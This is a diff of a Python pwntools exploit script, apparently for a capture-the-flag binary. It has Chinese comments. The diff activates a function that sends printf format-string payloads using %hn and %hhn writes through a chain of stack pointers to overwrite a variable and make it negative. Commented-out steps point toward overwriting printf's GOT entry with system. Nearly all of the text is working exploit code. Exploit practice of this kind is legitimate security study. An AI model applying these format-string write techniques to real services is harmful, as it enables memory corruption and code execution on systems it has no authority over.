@@ -48,42 +48,6 @@ PADDINGS = [
 
 
 class Actor:
-    # @property
-    # def esp_addr(self):
-    #     return self.ebp1addr - 136 - self.random_bytes
-
-    # @property
-    # def ebp0addr(self):
-    #     return self.esp_addr + 72
-
-    # @property
-    # def p0addr(self):
-    #     return self.esp_addr + self.random_bytes + 88
-
-    # @property
-    # def p1addr(self):
-    #     return self.esp_addr + self.random_bytes + 316
-
-    # @property
-    # def p2addr(self):
-    #     return (self.p1addr & 0xffffff00) + 0x100
-    
-    # @property
-    # def p0idx(self):
-    #     return (self.random_bytes + 88) // 4
-    
-    # @property
-    # def p1idx(self):
-    #     return (self.random_bytes + 316) // 4
-
-    # @property
-    # def p2idx(self):
-    #     return (self.p2addr - self.esp_addr) // 4
-
-    # @property
-    # def i_addr(self):
-    #     return self.ebp0addr - 0x14
-
     def __init__(self, io):
         self.io = io
         self._padding = None  # TODO: 随机化情况需要修改
@@ -182,17 +146,21 @@ class Actor:
     #     self.i_addr = self.ebp0addr - 0x14
     #     log.info("i_addr = 0x%x", self.i_addr)
 
-    # def set_var_i_minus(self):
-    #     # 修改变量i
-    #     # 0088| 0xffffd448 --> 0xffffd52c --> 0xffffd6b2 ("USER=admin")
-    #     # 上面有三重指针，而且指针均在栈上可被printf访问。逐级改写地址，使最后一个指向变量i
-    #     assert (self.i_addr + 3) & 0xffff == (self.i_addr & 0xffff) + 3  # 为了修改最高位，使其变为负数
-    #     payload = "%{data}c%{p0idx}$hn$$$$$$$$\0".format(p0idx=self.p0idx, data=(self.i_addr + 3) & 0xffff)
-    #     self.io.sendline(payload)
-    #     self.io.recvuntil("$$$$$$$$", drop=True)
-    #     payload = "%{data}c%{p1idx}$hhn$$$$$$$$\0".format(p1idx=self.p1idx, data=0x80)
-    #     self.io.sendline(payload)
-    #     self.io.recvuntil("$$$$$$$$", drop=True)
+    def set_var_i_minus(self):
+        # 修改变量i
+        # 0088| 0xffffd448 --> 0xffffd52c --> 0xffffd6b2 ("USER=admin")
+        # 上面有三重指针，而且指针均在栈上可被printf访问。逐级改写地址，使最后一个指向变量i
+        # 经测试，无法同时修改p1内容和i的内容
+        assert (self.i_addr + 3) & 0xffff == (self.i_addr & 0xffff) + 3  # 为了修改最高位，使其变为负数
+        bit4 = (self.i_addr + 3) & 0xffff
+        t = (0x80 - bit4) & 0xff
+        minus_data = t if t > 0 else 256
+        payload = "%{bit4}c%{p0idx}$hn%{minus_data}c%{p1idx}$hhn$$$$$$$$\0".format(
+            p0idx=self.p_idx[0], bit4=bit4,
+            p1idx=self.p_idx[1], minus_data=minus_data
+        )
+        self.io.sendline(payload)
+        self.io.recvuntil("$$$$$$$$", drop=True)
 
     # def write_printf_got_addresses(self):
     #     self.p2addr = (self.p1addr & 0xffffff00) + 0x100
@@ -233,11 +201,14 @@ class Actor:
     #     self.write_printf_got_addresses()
     #     self.write_system_to_printf_got()
 
+    def main(self):
+        self.detect_random()
+        self.set_var_i_minus()
 
 def main():
     io = remote(host, port) if len(sys.argv) > 1 else process(elf_name)
     actor = Actor(io)
-    actor.detect_random()
+    actor.main()
 
     gdb.attach(io)
     pause()
